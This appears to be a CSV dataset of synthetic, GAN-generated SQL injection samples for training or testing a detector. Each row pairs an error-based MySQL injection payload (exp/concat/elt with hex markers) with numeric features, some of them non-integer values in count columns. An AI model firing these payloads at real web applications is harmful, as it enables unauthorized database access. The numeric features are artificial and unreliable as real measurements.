id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000011,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,5.101784374201775,244.956787109375,73.2638931274414,32.29149627685547,97.13174438476562,1.7186033725738525,73.04754638671875,39.16681671142578,0.8218896389007568,0.29646337032318115,0.15422621369361877,0.3825676739215851,0.12419970333576202,3.795180320739746,1.2656657695770264,1.024403691291809,0.7919299602508545,0.19783219695091248,0.2021666020154953,0.10396925359964371,8.725151062011719,8.56884765625,2.9851033687591553,-0.02930913120508194,1.4670895338058472,0.1752413958311081,-0.12138422578573227,-0.07733739167451859,0.24950622022151947,0.5929818153381348,-0.032596610486507416,-0.2741500735282898,1.470105767250061,0.12644198536872864,0.495353639125824,1.8104480504989624,6.892818927764893,0.8297306895256042,2.1486656665802,0.01098670158535242,0.5387666821479797,0.9565900564193726,-0.0652124285697937,0.2035873681306839,0.07401947677135468,-0.1652582883834839,0.04334895312786102,0.3139708936214447,0.4301110804080963,0.498373806476593,0.13001874089241028,0.2264569103717804,0.15397991240024567,0.018709726631641388,0.09332016855478287,0.01603163406252861,0.05738444998860359,0.04959024116396904,0.05956137180328369,0.1530059278011322,-0.08794377744197845,0.013061314821243286,0.01504489779472351,0.03855578228831291,0.26002076268196106,-0.04293869063258171,0.40933558344841003,0.17519444227218628,0.19569800794124603,0.17102229595184326,-0.19172188639640808,-0.12909209728240967,0.1785508394241333,0.1290844827890396,0.06058763340115547,0.003217388642951846,1.216011881828308,0.2609312832355499,-0.1673324704170227,0.05409737676382065,0.20904842019081116,7.219258785247803,0.8032686114311218,0.17162179946899414,0.15148112177848816,0.6143573522567749,0.21878153085708618,0.09580107033252716,0.18152832984924316
GAN_000012,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,5.505012011408294,265.2153015136719,66.1259765625,34.06051254272461,96.63037109375,-0.19479820132255554,76.64051055908203,42.8546142578125,1.0931761264801025,0.27056097984313965,0.1457643061876297,0.39068397879600525,0.12649182975292206,3.738246202468872,1.252706527709961,1.5939199924468994,1.0615122318267822,0.26830175518989563,0.18101638555526733,0.059556007385253906,9.70356273651123,8.218708992004395,2.503657817840576,-0.015621431171894073,1.5597198009490967,0.2183324098587036,0.06627387553453445,-0.10230937600135803,0.2682351768016815,0.7201123237609863,-0.11287452280521393,-0.13946035504341125,1.261628270149231,0.26245030760765076,0.4166390299797058,1.978529453277588,6.222141265869141,0.47637268900871277,2.338902711868286,-0.014242543838918209,0.6472161412239075,1.1316206455230713,0.08398044109344482,0.19177722930908203,0.3880079388618469,-0.23217785358428955,-0.27824053168296814,0.4791572690010071,0.3576735258102417,0.526609480381012,0.06589769572019577,0.37796422839164734,-0.09884467720985413,0.2787403166294098,0.10291551798582077,0.005060120485723019,0.06270840018987656,0.2033490538597107,0.08943185210227966,-0.10081961750984192,0.062713623046875,0.18929423391819,-0.2915719747543335,-0.07297957688570023,0.3589620292186737,-0.09421786665916443,0.4190429449081421,0.3734395205974579,0.20405064523220062,0.21301597356796265,-0.2632444202899933,-0.2532041370868683,-0.029816225171089172,0.21786274015903473,0.09936273843050003,0.02309284545481205,1.1410497426986694,0.07028889656066895,-0.24800966680049896,-0.017735889181494713,0.189138263463974,7.381814479827881,0.821390688419342,0.20338527858257294,-0.02540716901421547,0.5872222781181335,0.0617702379822731,0.28086528182029724,0.031572237610816956
GAN_000013,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,4.984685356593319,242.99586486816406,70.57098388671875,33.39718246459961,90.93185424804688,5.367507457733154,71.77379608154297,35.51008605957031,1.084710717201233,0.32644400000572205,0.15176734328269958,0.3891048729419708,0.12486162781715393,3.787140130996704,0.9263662099838257,0.863090455532074,0.7491897940635681,0.21126927435398102,0.1257379651069641,0.06188230961561203,8.613636016845703,8.753836631774902,2.589836597442627,0.08225400745868683,1.6762293577194214,0.15323464572429657,-0.06018681079149246,0.007852500304579735,0.19816598296165466,0.4038024842739105,0.0467534214258194,-0.13807937502861023,1.3662041425704956,-0.05042664706707001,0.40949565172195435,1.959781527519226,7.133969783782959,0.8936931490898132,2.1085410118103027,0.20283570885658264,0.43159976601600647,0.9394605159759521,0.0563458576798439,0.2086917757987976,0.0793536901473999,-0.13954994082450867,-0.17576637864112854,0.3984118700027466,0.341707706451416,0.37445762753486633,0.24096885323524475,0.22699907422065735,-0.15303735435009003,0.08962432295084,0.15515856444835663,0.01993885263800621,0.05671820044517517,0.11511079967021942,-0.09643961489200592,0.11024840176105499,0.015289686620235443,-0.03257940337061882,-0.09735171496868134,0.07305735349655151,0.36939406394958496,-0.049635279923677444,0.5140411853790283,0.07192420214414597,0.04448799416422844,0.04061461612582207,0.1319865584373474,-0.10347390174865723,0.057967424392700195,-0.029686972498893738,0.05985209345817566,0.01279347762465477,0.9450244903564453,0.31255999207496643,0.004119940102100372,0.15879876911640167,0.1707630306482315,7.5694260597229,0.6234160661697388,0.15930937230587006,0.15803754329681396,0.5913927555084229,-0.06624826043844223,-0.14660406112670898,-0.10283978283405304
GAN_000014,attack,error,"1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",nearest_attack_euclidean,R000297,5.055802774520694,243.55758666992188,70.7273941040039,34.179969787597656,94.98651123046875,3.9816977977752686,73.0589599609375,40.07831573486328,1.1047468185424805,0.2935819625854492,0.14782430231571198,0.3865230679512024,0.12490027397871017,3.7429654598236084,1.1580746173858643,1.1590043306350708,1.015249490737915,0.24305672943592072,0.1874350905418396,-0.00472333375364542,8.635355949401855,8.543676376342773,2.566342353820801,0.08554623275995255,1.5198490619659424,0.17638002336025238,0.027254721149802208,-0.043843720108270645,0.2510809004306793,0.6272185444831848,-0.006051018834114075,-0.07759635150432587,1.3313422203063965,0.20306584239006042,0.4620574712753296,1.9557214975357056,6.713911056518555,0.5673419237136841,2.02400541305542,0.007138953544199467,0.5682108402252197,1.0145983695983887,0.06877803057432175,0.17876803874969482,0.1613357812166214,-0.1201491430401802,-0.17274050414562225,0.3349912166595459,0.37703031301498413,0.42190924286842346,0.044809985905885696,0.29330572485923767,-0.03369518369436264,0.18784114718437195,0.11761554330587387,0.01458319928497076,0.07635943591594696,0.18432141840457916,-0.01451566070318222,-0.04091264307498932,0.031040474772453308,0.08159086108207703,-0.10637038946151733,0.006343912333250046,0.3245120346546173,-0.04811219125986099,0.49814626574516296,0.1299242377281189,0.11368577182292938,0.13117998838424683,-0.14308175444602966,-0.21569478511810303,-0.03685649484395981,0.24184103310108185,0.05240799859166145,0.01692778803408146,1.1922320127487183,0.15498554706573486,-0.1252826303243637,0.04695180058479309,0.13349126279354095,7.590496063232422,0.6812564730644226,0.15444248914718628,0.0666251927614212,0.5892163515090942,0.039862968027591705,0.17840401828289032,-0.07916166633367538
GAN_000015,attack,error,"1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",nearest_attack_euclidean,R000297,5.012260055376727,242.35568237304688,70.00936126708984,33.46405029296875,95.38948059082031,3.6634433269500732,75.4068603515625,40.25746536254883,1.1719160079956055,0.28138378262519836,0.15412594377994537,0.3788638412952423,0.12617550790309906,3.7574143409729004,1.2395222187042236,0.8600603938102722,0.8156464099884033,0.20794729888439178,0.15513500571250916,0.2391759604215622,8.085692405700684,8.694679260253906,2.8914716243743896,-0.05677546560764313,1.4798686504364014,0.14770783483982086,-0.28775039315223694,-0.0404394157230854,0.11527586728334427,0.5438624024391174,-0.029638901352882385,-0.01795169711112976,1.3260602951049805,0.33240702748298645,0.5490318536758423,1.7943458557128906,6.599276065826416,0.4679825007915497,1.8119723796844482,0.07353423535823822,0.4825373888015747,1.163112759590149,-0.154542937874794,0.12285077571868896,0.014698341488838196,0.07334008812904358,-0.21856912970542908,0.34309113025665283,0.3889175355434418,0.3794606029987335,0.034888435155153275,0.2843438386917114,-0.09346151351928711,0.0246870294213295,0.13965201377868652,0.009787389077246189,0.020560193806886673,0.15507586300373077,0.17191843688488007,-0.09646296501159668,-0.09972880780696869,0.3499818444252014,0.03502005338668823,0.07638281583786011,0.2703540623188019,-0.15534207224845886,0.4559389650821686,0.1310560405254364,0.2915152311325073,0.03556840121746063,-0.10880085080862045,-0.136612668633461,0.0715932697057724,0.3405958414077759,0.04607755318284035,0.014301758259534836,1.1882966756820679,0.16147108376026154,-0.20308612287044525,-0.020022382959723473,0.16739733517169952,7.409738540649414,0.782787024974823,0.21824708580970764,0.01824648305773735,0.5207647085189819,-0.019582144916057587,0.3832000494003296,-0.11788146942853928
GAN_000016,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,5.017311797394806,244.7098388671875,66.87898254394531,33.09487533569336,87.67704772949219,7.267480850219727,76.84549713134766,37.64539337158203,0.9771793484687805,0.3038021922111511,0.1482216715812683,0.3788739740848541,0.12435798346996307,3.7666196823120117,0.8644907474517822,0.7180189490318298,0.7241112589836121,0.1772732138633728,0.09154914319515228,-0.038418516516685486,8.423596382141113,8.8463716506958,2.1017937660217285,0.1370166689157486,1.6727278232574463,0.16501069068908691,-0.08466178178787231,0.022119011729955673,0.17066852748394012,0.4320639669895172,-0.036194056272506714,-0.14746828377246857,1.3753713369369507,-0.0025069452822208405,0.4032513499259949,2.0491275787353516,7.101921081542969,0.8257454037666321,1.8473879098892212,0.09931075572967529,0.5090422630310059,1.0716331005096436,0.14849260449409485,0.1582511067390442,0.2596147060394287,-0.0628010705113411,-0.1061837375164032,0.3640011250972748,0.3421421945095062,0.3618738353252411,0.19396910071372986,0.27184972167015076,-0.15230761468410492,0.16245347261428833,0.1883557289838791,0.010707060806453228,0.032003115862607956,0.13294567167758942,-0.08576922118663788,0.23533852398395538,0.03021286427974701,-0.044023290276527405,-0.11898173391819,0.1350111961364746,0.38427063822746277,0.05409230291843414,0.4968840777873993,-0.008479125797748566,0.04930536076426506,-0.045573219656944275,0.04824242740869522,-0.17821626365184784,0.0032352618873119354,-0.05294838547706604,0.030614294111728668,0.017997929826378822,0.9874957203865051,0.23692956566810608,-0.12832289934158325,0.161501944065094,0.19596435129642487,7.8041887283325195,0.6391679048538208,0.19634707272052765,0.1491841971874237,0.5127118825912476,-0.18273788690567017,-0.15823881328105927,0.035445451736450195
GAN_000017,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,5.045125606396289,248.83949279785156,73.42733764648438,33.21193313598633,86.6182632446289,-0.009188382886350155,69.95417022705078,39.83027267456055,1.3148659467697144,0.3055044412612915,0.15989156067371368,0.38828006386756897,0.12479811161756516,3.7485313415527344,1.1211262941360474,1.0142028331756592,0.8996986746788025,0.20530202984809875,0.1535637080669403,0.03073139116168022,9.503396034240723,8.239605903625488,2.73281192779541,-0.12664783000946045,1.5138391256332397,0.14010119438171387,0.034033358097076416,-0.0366462804377079,0.12368360161781311,0.511676013469696,-0.06761066615581512,-0.06896793842315674,1.3590507507324219,0.07167655229568481,0.5224228501319885,2.0243117809295654,7.2300286293029785,0.8198999166488647,2.247145414352417,0.15781377255916595,0.488582968711853,0.8520995378494263,-0.027521498501300812,0.1665741354227066,0.013817496597766876,-0.08434281498193741,-0.12972773611545563,0.3664608299732208,0.40245482325553894,0.37821951508522034,0.03363271430134773,0.18381783366203308,-0.1382986307144165,0.08841172605752945,0.1311144381761551,0.003009471110999584,0.06891757994890213,0.06682801246643066,-0.0168522447347641,0.23460285365581512,-0.07274898141622543,-0.06540001928806305,-0.15769316256046295,0.16170914471149445,0.3824290335178375,-0.08242719620466232,0.6119369268417358,-0.02909177541732788,0.056417979300022125,0.047256018966436386,0.16232065856456757,-0.14217425882816315,0.16639074683189392,0.10963678359985352,0.09190330654382706,0.006202865857630968,1.0544298887252808,0.344208300113678,-0.21067096292972565,0.08991531282663345,0.15379956364631653,6.96838903427124,0.7197623252868652,0.1972440928220749,0.15262357890605927,0.6372897028923035,0.1018378958106041,-0.13667045533657074,-0.08034209161996841
GAN_000018,attack,error,"1'||  (  select 'xasp' from dual where 4025  =  4025 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000196,5.388185324724573,246.30809020996094,68.77469635009766,29.893220901489258,79.98277282714844,4.361627578735352,78.20735931396484,42.14875793457031,0.9622291326522827,0.28686368465423584,0.15282753109931946,0.3777382969856262,0.12539909780025482,3.7308411598205566,0.7500482201576233,0.7418198585510254,0.6817098259925842,0.17487655580043793,0.1306731253862381,0.08699323236942291,9.087038040161133,7.743042945861816,1.8667656183242798,0.07745540887117386,1.4650325775146484,0.18151777982711792,-0.04765576869249344,-0.018147418275475502,0.11974642425775528,0.4298568069934845,-0.12786920368671417,-0.16214993596076965,1.260345697402954,0.06187646836042404,0.4256179928779602,2.134488344192505,7.164306163787842,0.7241805791854858,2.027492046356201,0.05687031149864197,0.5581263303756714,1.1932958364486694,0.09047482907772064,0.11620508134365082,0.3732605576515198,-0.18959015607833862,-0.1182384341955185,0.422186940908432,0.32992422580718994,0.39083197712898254,0.1366051286458969,0.20951838791370392,-0.30660730600357056,0.251310795545578,0.19507227838039398,-0.015885265544056892,0.02531554363667965,0.16203469038009644,-0.03449110686779022,0.49870795011520386,0.024853020906448364,-0.014122705906629562,-0.3007456064224243,0.23458555340766907,0.5215051174163818,0.09224677830934525,0.4748614728450775,0.07799725979566574,0.08244876563549042,-0.1887868493795395,0.08263100683689117,-0.2813136875629425,0.05239872634410858,-0.05407834053039551,0.0603819414973259,0.01814139261841774,1.0181207656860352,0.14669181406497955,-0.22193457186222076,0.12248044461011887,0.19626262784004211,7.494943141937256,0.7646774053573608,0.23807315528392792,0.0884886085987091,0.6153314113616943,-0.0391644686460495,-0.19626446068286896,0.027785807847976685
GAN_000019,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,5.24315648715693,247.3070831298828,63.90473937988281,33.28519058227539,94.41433715820312,-0.0476815402507782,78.9605941772461,39.544246673583984,0.8365567326545715,0.29378777742385864,0.14972293376922607,0.38102802634239197,0.12774252891540527,3.790337324142456,1.1411221027374268,0.870847225189209,0.6692192554473877,0.1866895854473114,0.16416862607002258,0.22942809760570526,8.725079536437988,8.657071113586426,2.7683677673339844,-0.012795686721801758,1.4494363069534302,0.16846227645874023,-0.14538012444972992,-0.06690455973148346,0.23186981678009033,0.598381519317627,-0.04752983897924423,-0.3704059422016144,1.359100103378296,0.17212659120559692,0.41265568137168884,1.9011414051055908,7.030496597290039,0.7205846309661865,2.0545830726623535,0.024449052289128304,0.5556083917617798,1.080022931098938,-0.016639553010463715,0.15430514514446259,0.3166055679321289,-0.17578235268592834,-0.06979482620954514,0.4337753653526306,0.4376232624053955,0.4930543303489685,0.1931576281785965,0.19626526534557343,-0.005929581820964813,-0.004102308303117752,0.10264835506677628,-0.001660325564444065,0.033735696226358414,0.1827356070280075,-0.11352691799402237,0.3078438341617584,-0.07483012229204178,0.12469837069511414,-0.1550114005804062,-0.01644822768867016,0.3529878854751587,0.12510070204734802,0.32015886902809143,0.3167470693588257,0.18134532868862152,0.060338232666254044,-0.24523204565048218,-0.2015015333890915,0.17083463072776794,0.014306694269180298,0.07165215164422989,0.009835058823227882,1.1104110479354858,0.13914288580417633,-0.20288385450839996,0.131491020321846,0.17309176921844482,7.262378692626953,0.8606880903244019,0.2172299176454544,0.019416209310293198,0.5551952123641968,0.087211474776268,0.06514650583267212,0.0861160010099411
GAN_000020,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,5.499114400098222,243.26190185546875,67.56205749511719,31.169157028198242,93.03982543945312,1.5226471424102783,78.04769134521484,43.209007263183594,0.814308762550354,0.2735790014266968,0.15250061452388763,0.38414865732192993,0.12436652183532715,3.796642541885376,1.0871981382369995,1.1766357421875,0.8022516965866089,0.22165673971176147,0.23858708143234253,0.09741377830505371,9.193150520324707,8.900790214538574,2.631000280380249,-0.056201204657554626,1.427542805671692,0.22665996849536896,-0.1330961436033249,-0.09821057319641113,0.2666130065917969,0.744961678981781,-0.1189797967672348,-0.2611309289932251,1.2840203046798706,0.1239774227142334,0.5183902978897095,1.9386450052261353,6.9506964683532715,0.5813987255096436,2.173788070678711,-0.1416594535112381,0.6632327437400818,1.1358143091201782,-0.04949745535850525,0.15649724006652832,0.2240038961172104,-0.13665390014648438,-0.02123285084962845,0.3999723494052887,0.509819746017456,0.5619472861289978,0.033832866698503494,0.20822662115097046,0.13291071355342865,0.1666347086429596,0.12840749323368073,0.006036936305463314,0.016593463718891144,0.1021929383277893,0.09980535507202148,0.11761907488107681,0.09539476037025452,0.15475383400917053,-0.18294988572597504,0.03935899958014488,0.27892938256263733,-0.11233458667993546,0.3286336362361908,0.35603049397468567,0.2467750757932663,0.14572933316230774,-0.3525037169456482,-0.18107877671718597,0.2208208441734314,0.20651939511299133,0.04809524491429329,0.004207962192595005,1.338836908340454,0.12636683881282806,-0.3027917742729187,-0.008777759037911892,0.18911653757095337,7.295037746429443,0.8812033534049988,0.18147748708724976,0.06926340609788895,0.6020676493644714,0.22567397356033325,0.30941933393478394,0.1723504662513733
GAN_000021,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,5.437433247709837,237.41331481933594,64.59432983398438,32.04105758666992,93.18599700927734,1.8824779987335205,81.02779388427734,45.1088981628418,0.7291865348815918,0.2654256522655487,0.15728230774402618,0.3821311593055725,0.12351837754249573,3.774322032928467,1.129774570465088,1.0065891742706299,0.7679922580718994,0.2568676173686981,0.1862209439277649,0.11895987391471863,9.280664443969727,9.039006233215332,2.6718907356262207,-0.032512106001377106,1.399178147315979,0.24037691950798035,-0.1889171004295349,-0.08919888734817505,0.26060950756073,0.7338630557060242,-0.17476466298103333,-0.3142685890197754,1.4269802570343018,0.11914095282554626,0.48427218198776245,2.079397678375244,7.315698146820068,0.6236632466316223,2.1723246574401855,-0.16485966742038727,0.691129744052887,1.1503031253814697,0.014635130763053894,0.15756744146347046,0.4030883312225342,-0.157150000333786,0.1039571613073349,0.3670123517513275,0.4969095289707184,0.5757461786270142,0.00794075895100832,0.16039539873600006,0.2597056031227112,0.0892186090350151,0.11544129997491837,0.0024410849437117577,0.03872601315379143,0.12346923351287842,0.02645602822303772,0.17535483837127686,0.0857507735490799,0.039523884654045105,-0.1345357447862625,0.07866232097148895,0.2966602146625519,-0.0332399383187294,0.35098522901535034,0.22334006428718567,0.22370226681232452,0.09271828085184097,-0.4396499693393707,-0.19117991626262665,0.1766398698091507,0.187965527176857,0.04602331295609474,0.005778244696557522,1.4503631591796875,0.1333913505077362,-0.3336353898048401,0.050637081265449524,0.21442869305610657,7.683027267456055,0.8732995390892029,0.202874556183815,0.057979460805654526,0.564246654510498,0.20437628030776978,0.24169927835464478,0.27350130677223206
GAN_000022,attack,error,"1'||  (  select 'xasp' from dual where 4025  =  4025 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000196,5.211962678328434,244.902587890625,72.10630798339844,31.62346076965332,98.6939926147461,2.4565303325653076,74.65904998779297,41.59750747680664,1.0524301528930664,0.287824422121048,0.13975144922733307,0.38180798292160034,0.12597286701202393,3.7640514373779297,1.3494470119476318,1.1598591804504395,0.896945595741272,0.16748635470867157,0.1487482488155365,0.18149782717227936,9.644890785217285,8.061848640441895,3.03808331489563,0.009615346789360046,1.4043397903442383,0.149797722697258,0.04161129891872406,-0.06252827495336533,0.10345533490180969,0.6457820534706116,-0.19597581028938293,-0.11543502658605576,1.277414083480835,0.25106102228164673,0.5097153782844543,1.8299803733825684,6.159289360046387,0.43435153365135193,2.215667963027954,0.034756138920784,0.6887998580932617,1.216722011566162,0.08658425509929657,0.12598393857479095,0.27762287855148315,-0.01564452052116394,-0.25871092081069946,0.40421345829963684,0.3664151728153229,0.4830559194087982,0.013004650361835957,0.36509498953819275,0.020421378314495087,0.0920887365937233,0.15103207528591156,-0.023390354588627815,0.04307100549340248,-0.05452350154519081,0.18640176951885223,0.15163899958133698,-0.04926322400569916,0.23429296910762787,-0.1804821640253067,-0.034898966550827026,0.32035863399505615,0.08033672720193863,0.40861889719963074,0.24063655734062195,0.21890032291412354,-0.01555798202753067,-0.25958946347236633,-0.2954557538032532,0.03508090227842331,0.14182308316230774,0.05443332716822624,0.015110586769878864,1.1146163940429688,0.0806795060634613,-0.3026201128959656,-0.023173382505774498,0.1455414593219757,7.285767078399658,0.8295758962631226,0.18329238891601562,-0.026716772466897964,0.5835724472999573,-0.058932773768901825,0.3214995563030243,0.030086517333984375
